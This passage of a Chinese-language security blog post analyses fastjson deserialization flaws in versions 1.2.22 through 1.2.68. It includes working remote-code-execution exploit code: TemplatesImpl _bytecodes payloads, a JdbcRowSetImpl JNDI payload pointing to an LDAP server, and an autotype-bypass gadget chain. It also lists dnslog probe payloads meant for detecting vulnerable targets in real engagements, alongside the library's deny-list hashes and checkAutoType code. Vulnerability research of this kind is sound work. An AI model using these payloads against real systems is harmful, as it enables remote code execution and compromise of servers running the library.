通过此方法将 exp 中的`_bytecodes`、`_name`、`_tfactory`赋新值，运行到`_outputProperties`时，`Properties`属性继承与 Map，进入`MapDeserializer`，生成对应的`Properties`对象，运行到`setValue`方法时，`_outputProperties`的声明字段为方法，`method`不为 null 且无参，进入到`(Map)method.invoke(object)`，反射方法，接着分析`TemplatesImpl.getOutputProperties->newTransformer->getTransletInstance->defineTransletClasses`，最后会对`_name`判断是否为空，接着通过`defineClass`加载`_bytecodes`字节码转为 Class，成功实现 rce

后面的绕过其实就是之前分析的 L、;、\[，这三个字符，基于黑名单采用在引用类前增加这些字符，具体的方法，在最后的参考链接贴出，不做具体分析

fastjson 1.2.47

此版本是不开启 autotype 可以成功利用，虽然和历史漏洞不大相关，但是还是分析一下漏洞点以及漏洞挖掘的思路，**hint:** 漏洞利用了 fastjson 默认的缓存机制

fastjson 在处理 json 数据时会先加载配置，在`ParserConfig.initDeserializers`方法中写明对应的类与之后处理此类的对应接口

```
private void initDeserializers() {
        this.deserializers.put(SimpleDateFormat.class, MiscCodec.instance);
        this.deserializers.put(Timestamp.class, SqlDateDeserializer.instance\_timestamp);
        this.deserializers.put(Date.class, SqlDateDeserializer.instance);
        this.deserializers.put(Time.class, TimeDeserializer.instance);
        this.deserializers.put(java.util.Date.class, DateCodec.instance);
        this.deserializers.put(Calendar.class, CalendarCodec.instance);
        this.deserializers.put(XMLGregorianCalendar.class, CalendarCodec.instance);
        this.deserializers.put(JSONObject.class, MapDeserializer.instance);
        this.deserializers.put(JSONArray.class, CollectionCodec.instance);
        this.deserializers.put(Map.class, MapDeserializer.instance);
        this.deserializers.put(HashMap.class, MapDeserializer.instance);
        this.deserializers.put(LinkedHashMap.class, MapDeserializer.instance);
        this.deserializers.put(TreeMap.class, MapDeserializer.instance);
        this.deserializers.put(ConcurrentMap.class, MapDeserializer.instance);
        this.deserializers.put(ConcurrentHashMap.class, MapDeserializer.instance);
        this.deserializers.put(Collection.class, CollectionCodec.instance);
        this.deserializers.put(List.class, CollectionCodec.instance);
        this.deserializers.put(ArrayList.class, CollectionCodec.instance);
        this.deserializers.put(Object.class, JavaObjectDeserializer.instance);
        this.deserializers.put(String.class, StringCodec.instance);
        this.deserializers.put(StringBuffer.class, StringCodec.instance);
        this.deserializers.put(StringBuilder.class, StringCodec.instance);
        this.deserializers.put(Character.TYPE, CharacterCodec.instance);
        this.deserializers.put(Character.class, CharacterCodec.instance);
        this.deserializers.put(Byte.TYPE, NumberDeserializer.instance);
        this.deserializers.put(Byte.class, NumberDeserializer.instance);
        this.deserializers.put(Short.TYPE, NumberDeserializer.instance);
        this.deserializers.put(Short.class, NumberDeserializer.instance);
        this.deserializers.put(Integer.TYPE, IntegerCodec.instance);
        this.deserializers.put(Integer.class, IntegerCodec.instance);
        this.deserializers.put(Long.TYPE, LongCodec.instance);
        this.deserializers.put(Long.class, LongCodec.instance);
        this.deserializers.put(BigInteger.class, BigIntegerCodec.instance);
        this.deserializers.put(BigDecimal.class, BigDecimalCodec.instance);
        this.deserializers.put(Float.TYPE, FloatCodec.instance);
        this.deserializers.put(Float.class, FloatCodec.instance);
        this.deserializers.put(Double.TYPE, NumberDeserializer.instance);
        this.deserializers.put(Double.class, NumberDeserializer.instance);
        this.deserializers.put(Boolean.TYPE, BooleanCodec.instance);
        this.deserializers.put(Boolean.class, BooleanCodec.instance);
        this.deserializers.put(Class.class, MiscCodec.instance);
        this.deserializers.put(char\[\].class, new CharArrayCodec());
        this.deserializers.put(AtomicBoolean.class, BooleanCodec.instance);
        this.deserializers.put(AtomicInteger.class, IntegerCodec.instance);
        this.deserializers.put(AtomicLong.class, LongCodec.instance);
        this.deserializers.put(AtomicReference.class, ReferenceCodec.instance);
        this.deserializers.put(WeakReference.class, ReferenceCodec.instance);
        this.deserializers.put(SoftReference.class, ReferenceCodec.instance);
        this.deserializers.put(UUID.class, MiscCodec.instance);
        this.deserializers.put(TimeZone.class, MiscCodec.instance);
        this.deserializers.put(Locale.class, MiscCodec.instance);
        this.deserializers.put(Currency.class, MiscCodec.instance);
        this.deserializers.put(InetAddress.class, MiscCodec.instance);
        this.deserializers.put(Inet4Address.class, MiscCodec.instance);
        this.deserializers.put(Inet6Address.class, MiscCodec.instance);
        this.deserializers.put(InetSocketAddress.class, MiscCodec.instance);
        this.deserializers.put(File.class, MiscCodec.instance);
        this.deserializers.put(URI.class, MiscCodec.instance);
        this.deserializers.put(URL.class, MiscCodec.instance);
        this.deserializers.put(Pattern.class, MiscCodec.instance);
        this.deserializers.put(Charset.class, MiscCodec.instance);
        this.deserializers.put(JSONPath.class, MiscCodec.instance);
        this.deserializers.put(Number.class, NumberDeserializer.instance);
        this.deserializers.put(AtomicIntegerArray.class, AtomicCodec.instance);
        this.deserializers.put(AtomicLongArray.class, AtomicCodec.instance);
        this.deserializers.put(StackTraceElement.class, StackTraceElementDeserializer.instance);
        this.deserializers.put(Serializable.class, JavaObjectDeserializer.instance);
        this.deserializers.put(Cloneable.class, JavaObjectDeserializer.instance);
        this.deserializers.put(Comparable.class, JavaObjectDeserializer.instance);
        this.deserializers.put(Closeable.class, JavaObjectDeserializer.instance);
        this.deserializers.put(JSONPObject.class, new JSONPDeserializer());
    }
```

首先这个版本对 autotype 有限制，默认为关闭，在`ParserConfig.checkAutoType`方法中在开启 autotype 会首先判断是否为白名单，如果为白名单直接加载类。先贴出 payload

```
{
    "rand1": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "rand2": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "ldap://localhost:1389/Object", 
        "autoCommit": true
    }
}
```

通过之前的分析，可以清楚 fastjson 对于 json 数据的处理，所以这步直接略过，进入`key`为 @type，payload 加载了`java.lang.Class`，可以看到对应为`MiscCodec`，之后会进入`MiscCodec.class`文件，接下来的处理方式和之前一样，调用`DefaultJSONParser`类，进入到`ParserConfig.checkAutoType`的 833 行，对之前加载的配置进行调用`findclass`方法，获取到`java.lang.Class`直接加载返回，之后进入`MiscCodec.class`的处理，这里不具体分析，最后调用到`TypeUtils.loadClass`方法放入 mapping 中，之后跳出到`DefaultJSONParser`类，执行`map.put(key, obj)`将 rand1 与 obj 放入 map 中，其中 obj 为`MiscCodec.class->objVal = parser.parse()->DefaultJSONParser->parse()->case 4`直接将恶意类载入，第二次解析嵌套 json 时会在 mapping 中直接寻找，然后和之前一样运行到`JdbcRowSetImpl`类中。

通过对此的分析，这边结合 1.22 的 exp，提升为 1.2.47 的 exp，如下所示：

```
public class rce\_47 {
    public static void main(String\[\] args) {
        String evil\_path = "D:\\\\Class\_Folder\\\\fastjson\\\\target\\\\classes\\\\com\\\\fastjson\\\\demo\\\\evilClass.class";
        rce\_22 rce = new rce\_22();
        String evil\_code = rce.readClass(evil\_path);
        String payload = "{\\n" +
                "    \\"rand1\\": {\\n" +
                "        \\"@type\\": \\"java.lang.Class\\", \\n" +
                "        \\"val\\": \\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\"\\n" +
                "    }, \\n" +
                "    \\"rand2\\": {\\n" +
                "        \\"@type\\": \\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\"," +
                "        \\"\_bytecodes\\":\[\\""+evil\_code+"\\"\]," +
                "        '\_name':'a.b'," +
                "        '\_tfactory':{ }," +
                "       \\"\_outputProperties\\":{ }}\\n" +
                "    }\\n" +
                "}";
        JSON.parseObject(payload, Class.class, Feature.SupportNonPublicField);
    }
}
```

fastjson 1.2.68

最近的 68 版本又产生了一次绕过，为了更好的分析漏洞点，我把最近几次更新的黑名单及链接贴出来

<table><thead><tr><th>1.2.68</th><th>-3077205613010077203L</th><th>0xd54b91cc77b239edL</th><th>org.apache.shiro.jndi.</th></tr></thead><tbody><tr><td>1.2.68</td><td>-2825378362173150292L</td><td>0xd8ca3d595e982bacL</td><td>org.apache.ignite.cache.jta.</td></tr><tr><td>1.2.68</td><td>2078113382421334967L</td><td>0x1cd6f11c6a358bb7L</td><td>javax.swing.J</td></tr><tr><td>1.2.68</td><td>6007332606592876737L</td><td>0x535e552d6f9700c1L</td><td>org.aoju.bus.proxy.provider.</td></tr><tr><td>1.2.68</td><td>9140390920032557669L</td><td>0x7ed9311d28bf1a65L</td><td>java.awt.p</td></tr><tr><td>1.2.68</td><td>9140416208800006522L</td><td>0x7ed9481d28bf417aL</td><td>java.awt.i</td></tr><tr><td>1.2.69</td><td>-8024746738719829346L</td><td>0x90a25f5baa21529eL</td><td>java.io.Serializable</td></tr><tr><td>1.2.69</td><td>-5811778396720452501L</td><td>0xaf586a571e302c6bL</td><td>java.io.Closeable</td></tr><tr><td>1.2.69</td><td>-3053747177772160511L</td><td>0xd59ee91f0b09ea01L</td><td>oracle.jms.AQ</td></tr><tr><td>1.2.69</td><td>-2114196234051346931L</td><td>0xe2a8ddba03e69e0dL</td><td>java.util.Collection</td></tr><tr><td>1.2.69</td><td>-2027296626235911549L</td><td>0xe3dd9875a2dc5283L</td><td>java.lang.Iterable</td></tr><tr><td>1.2.69</td><td>-2939497380989775398L</td><td>0xd734ceb4c3e9d1daL</td><td>java.lang.Object</td></tr><tr><td>1.2.69</td><td>-1368967840069965882L</td><td>0xed007300a7b227c6L</td><td>java.lang.AutoCloseable</td></tr><tr><td>1.2.69</td><td>2980334044947851925L</td><td>0x295c4605fd1eaa95L</td><td>java.lang.Readable</td></tr><tr><td>1.2.69</td><td>3247277300971823414L</td><td>0x2d10a5801b9d6136L</td><td>java.lang.Cloneable</td></tr><tr><td>1.2.69</td><td>5183404141909004468L</td><td>0x47ef269aadc650b4L</td><td>java.lang.Runnable</td></tr><tr><td>1.2.69</td><td>7222019943667248779L</td><td>0x6439c4dff712ae8bL</td><td>java.util.EventListener</td></tr></tbody></table>

对于 autotype 的绕过，主要在`checkAutoType`方法中，之前有简单分析一下，这次贴出代码重点分析一下（包括我踩过的一些坑）

```
public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
        if (typeName == null) {
            return null;
        } else {
            if (this.autoTypeCheckHandlers != null) {
                Iterator var4 = this.autoTypeCheckHandlers.iterator();
                while(var4.hasNext()) {
                    ParserConfig.AutoTypeCheckHandler h = (ParserConfig.AutoTypeCheckHandler)var4.next();
                    Class<?> type = h.handler(typeName, expectClass, features);
                    if (type != null) {
                        return type;
                    }
                }
            }
            int safeModeMask = Feature.SafeMode.mask;
            //开启safemode后不支持@type调用类
            boolean safeMode = this.safeMode || (features & safeModeMask) != 0 || (JSON.DEFAULT\_PARSER\_FEATURE & safeModeMask) != 0;
            if (safeMode) {
                throw new JSONException("safeMode not support autoType : " + typeName);
            } else if (typeName.length() < 192 && typeName.length() >= 3) {
                //配合之后白名单使用，expectClass类型限制
                boolean expectClassFlag;
                if (expectClass == null) {
                    expectClassFlag = false;
                } else if (expectClass != Object.class && expectClass != Serializable.class && expectClass != Cloneable.class && expectClass != Closeable.class && expectClass != EventListener.class && expectClass != Iterable.class && expectClass != Collection.class) {
                    expectClassFlag = true;
                } else {
                    expectClassFlag = false;
                }
                String className = typeName.replace('$', '.');
                long BASIC = -3750763034362895579L;
                long PRIME = 1099511628211L;
                long h1 = (-3750763034362895579L ^ (long)className.charAt(0)) \* 1099511628211L;
                if (h1 == -5808493101479473382L) {
                    throw new JSONException("autoType is not support. " + typeName);
                } else if ((h1 ^ (long)className.charAt(className.length() - 1)) \* 1099511628211L == 655701488918567152L) {
                    throw new JSONException("autoType is not support. " + typeName);
                } else {
                    long h3 = (((-3750763034362895579L ^ (long)className.charAt(0)) \* 1099511628211L ^ (long)className.charAt(1)) \* 1099511628211L ^ (long)className.charAt(2)) \* 1099511628211L;
                    long fullHash = TypeUtils.fnv1a\_64(className);
                    boolean internalWhite = Arrays.binarySearch(INTERNAL\_WHITELIST\_HASHCODES, fullHash) >= 0;
                    long hash;
                    int mask;
                    if (this.internalDenyHashCodes != null) {
                        hash = h3;
                        for(mask = 3; mask < className.length(); ++mask) {
                            hash ^= (long)className.charAt(mask);
                            hash \*= 1099511628211L;
                            if (Arrays.binarySearch(this.internalDenyHashCodes, hash) >= 0) {
                                throw new JSONException("autoType is not support. " + typeName);
                            }
                        }
                    }
                    Class clazz;
                    //判断typeName不在白名单内且expectClassFlag或autoTypeSupport为true
                    if (!internalWhite && (this.autoTypeSupport || expectClassFlag)) {
                        hash = h3;
                        for(mask = 3; mask < className.length(); ++mask) {
                            hash ^= (long)className.charAt(mask);
                            hash \*= 1099511628211L;
                            //逐词比对是否在白名单内
                            if (Arrays.binarySearch(this.acceptHashCodes, hash) >= 0) {
                                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true);
                                if (clazz != null) {
                                    return clazz;
                                }
                            }
                            //逐词判断是否在黑名单中（这里会有很多类无法使用，例如com.sun.开头）
                            if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null && Arrays.binarySearch(this.acceptHashCodes, fullHash) < 0) {
                                throw new JSONException("autoType is not support. " + typeName);
                            }
                        }
                    }
                    //从缓存中读取clazz
                    clazz = TypeUtils.getClassFromMapping(typeName);
                    if (clazz == null) {
                        clazz = this.deserializers.findClass(typeName);
                    }
                    if (clazz == null) {
                        clazz = (Class)this.typeMapping.get(typeName);
                    }
                    if (internalWhite) {
                        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true);
                    }
                    if (clazz != null) {
                        //判断clazz的子类是否为expectClass
                        if (expectClass != null && clazz != HashMap.class && !expectClass.isAssignableFrom(clazz)) {
                            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                        } else {
                            return clazz;
                        }
                    } else {
                        if (!this.autoTypeSupport) {
                            hash = h3;
                            for(mask = 3; mask < className.length(); ++mask) {
                                char c = className.charAt(mask);
                                hash ^= (long)c;
                                hash \*= 1099511628211L;
                                if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0) {
                                    throw new JSONException("autoType is not support. " + typeName);
                                }
                                if (Arrays.binarySearch(this.acceptHashCodes, hash) >= 0) {
                                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true);
                                    if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                                    }
                                    return clazz;
                                }
                            }
                        }
                        boolean jsonType = false;
                        InputStream is = null;
                        try {
                            String resource = typeName.replace('.', '/') + ".class";
                            if (this.defaultClassLoader != null) {
                                is = this.defaultClassLoader.getResourceAsStream(resource);
                            } else {
                                is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
                            }
                            if (is != null) {
                                ClassReader classReader = new ClassReader(is, true);
                                TypeCollector visitor = new TypeCollector("<clinit>", new Class\[0\]);
                                classReader.accept(visitor);
                                jsonType = visitor.hasJsonType();
                            }
                        } catch (Exception var28) {
                        } finally {
                            IOUtils.close(is);
                        }
                        mask = Feature.SupportAutoType.mask;
                        boolean autoTypeSupport = this.autoTypeSupport || (features & mask) != 0 || (JSON.DEFAULT\_PARSER\_FEATURE & mask) != 0;
                        if (autoTypeSupport || jsonType || expectClassFlag) {
                            boolean cacheClass = autoTypeSupport || jsonType;
                            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, cacheClass);
                        }
                        if (clazz != null) {
                            if (jsonType) {
                                TypeUtils.addMapping(typeName, clazz);
                                return clazz;
                            }
                            //clazz不能为ClassLoader、DataSource和RowSet的子类
                            if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz) || RowSet.class.isAssignableFrom(clazz)) {
                                throw new JSONException("autoType is not support. " + typeName);
                            }
                            if (expectClass != null) {
                                //expectClass为clazz的子类加入缓存
                                if (expectClass.isAssignableFrom(clazz)) {
                                    TypeUtils.addMapping(typeName, clazz);
                                    return clazz;
                                }
                                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                            }
                            JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, this.propertyNamingStrategy);
                            if (beanInfo.creatorConstructor != null && autoTypeSupport) {
                                throw new JSONException("autoType is not support. " + typeName);
                            }
                        }
                        if (!autoTypeSupport) {
                            throw new JSONException("autoType is not support. " + typeName);
                        } else {
                            if (clazz != null) {
                                TypeUtils.addMapping(typeName, clazz);
                            }
                            return clazz;
                        }
                    }
                }
            } else {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
    }
```

从代码中可以看出，想要通过检查需要满足以下三点

```
1.首先clazz要在mapping缓存中
2.不能在黑名单中

3.之后传入的类要继承之前的clazz
```

对于 mapping 的缓存，之前有分析过，在一开始 fastjson 载入了一些基础类，可以根据基础类进行分析，我这边直接调用大佬分析过的轮子，写一个 demo（我这个没有 rce 的功能，大家自己发掘吧，最后我贴个链接出来）

```
String payload = "{\\"@type\\":\\"java.lang.AutoCloseable\\",\\"@type\\":\\"org.apache.commons.io.input.XmlStreamReader\\",\\"defaultEncoding\\":\\"UTF-8\\",\\"httpContentType\\":\\"text/xml\\",\\"is\\":{\\"@type\\":\\"org.apache.commons.io.input.ReaderInputStream\\",\\"bufferSize\\":\\"1024\\",\\"charsetName\\":\\"UTF-8\\",\\"reader\\":{\\"@type\\":\\"jdk.nashorn.api.scripting.URLReader\\",\\"url\\":\\"http://127.0.0.1:8080",\\"cs\\":\\"UTF-8\\"}}}}";

JSON.parseObject(payload, Class.class)
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ichibzUNjHLgoH6ynQkasibicialUnI8LLrDBAZHFOSuTxicrxrzzPXxTecK0SSs5ghGd7SzU1eJibK4sFQ/640?wx_fmt=png)

实战检测

在日常实战过程中，当遇到传输`json`数据时，可以利用不闭合花括号的形式，尝试客户端是否会报错，当不存在报错时，可以追加本不存在的 key，查看客户端回显（`fastjson`并无 **key** 与 **javabean** 强制对齐的情况。除以上情况，还可以利用`dnslog`进行探测

```
{"@type":"java.net.InetAddress","val":"http://dnslog"}
{"@type":"java.net.Inet4Address","val":"http://dnslog"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"http://dnslog"}}
{"@type":"java.net.URL","val":"http://dnslog"}
```

当然除了探测，rce 的 payload 也是有的（rce 后的数字对应版本号）

```
public class rce\_22 {
    public String readClass(String cls){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            try {
                IOUtils.copy(new FileInputStream(new File(cls)), bos);
            } catch (IOException e) {
                e.printStackTrace();
            }
            String result = Base64.encodeBase64String(bos.toByteArray());
            return result;
        }
    public static void rce\_22() {
            rce\_22 rce = new rce\_22();
            ParserConfig config = new ParserConfig();
            //evilClass可以参照ysoserial中对TemplatesImpl的处理
            String evil\_path = "evilClass.class";
            String evil\_code = rce.readClass(evil\_path);
            final String NASTY\_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\\"@type\\":\\"" + NASTY\_CLASS +
                    "\\",\\"\_bytecodes\\":\[\\""+evil\_code+"\\"\]," +
                    "'\_name':'a.b'," +
                    "'\_tfactory':{ }," +
                    "\\"\_outputProperties\\":{ }}\\n";
            System.out.println(text1);
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
        }
    public static void main(String args\[\]) {
        rce\_22();
    }
}
public class rce\_47 {
    public static void main(String\[\] args) {
        String evil\_path = "D:\\\\Class\_Folder\\\\fastjson\\\\target\\\\classes\\\\com\\\\fastjson\\\\demo\\\\evilClass.class";
        rce\_22 rce = new rce\_22();
        String evil\_code = rce.readClass(evil\_path);
        //47也可同样利用22的方式，先进入map缓存，之后再调取，绕过autotype
        /\*
        String payload = "{\\n" +
                "    \\"rand1\\": {\\n" +
                "        \\"@type\\": \\"java.lang.Class\\", \\n" +
                "        \\"val\\": \\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\"\\n" +
                "    }, \\n" +
                "    \\"rand2\\": {\\n" +
                "        \\"@type\\": \\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\"," +
                "        \\"\_bytecodes\\":\[\\""+evil\_code+"\\"\]," +
                "        '\_name':'a.b'," +
                "        '\_tfactory':{ }," +
                "       \\"\_outputProperties\\":{ }}\\n" +
                "    }\\n" +
                "}";
                \*/
        String payload = "{\\n" +
                "    \\"rand1\\": {\\n" +
                "        \\"@type\\": \\"java.lang.Class\\", \\n" +
                "        \\"val\\": \\"com.sun.rowset.JdbcRowSetImpl\\"\\n" +
                "    }, \\n" +
                "    \\"rand2\\": {\\n" +
                "        \\"@type\\": \\"com.sun.rowset.JdbcRowSetImpl\\", \\n" +
                "        \\"dataSourceName\\": \\"ldap://localhost:1389/Object\\", \\n" +
                "        \\"autoCommit\\": true\\n" +
                "    }\\n" +
                "}";
        JSON.parseObject(payload, Class.class, Feature.SupportNonPublicField);
    }
}
```

在这里抛砖引玉一下，除了上述的攻击方式，也可利用特性，如 L 等，做一些绕过，期待大佬更骚的姿势

参考链接

\[1\]: https://paper.seebug.org/1236/ "浅谈下 Fastjson 的 autotype 绕过" \[2\]: http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#v1-2-41 "FastJson 反序列化学习" \[3\]: https://paper.seebug.org/1192/ "Fastjson 反序列化漏洞史"

end

  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ichibzUNjHLgoH6ynQkasibicia71GgpyC0F6HFAmR2ZN97PNj5ZjaV9Drepe9gDJY43uLL7kZ5xLc8Jw/640?wx_fmt=png)